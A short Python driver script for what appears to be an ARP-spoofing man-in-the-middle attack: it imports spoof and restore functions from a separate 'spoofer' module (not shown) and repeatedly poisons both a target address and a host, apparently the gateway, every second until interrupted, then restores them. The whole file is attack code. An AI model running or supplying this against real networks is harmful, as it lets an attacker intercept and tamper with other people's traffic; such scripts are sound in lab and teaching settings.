#!/usr/bin/env python3
# main.py
from spoofer import *

if __name__ == "__main__":

	target = "100.64.1.69"
	host = "100.64.1.1"
	verbose = True

	try:
		while True:
			spoof(target, host, verbose)
			spoof(host, target, verbose)
			time.sleep(1)

	except KeyboardInterrupt:
		print("Stopping spoofing")
		restore(target, host)
		restore(host, target)

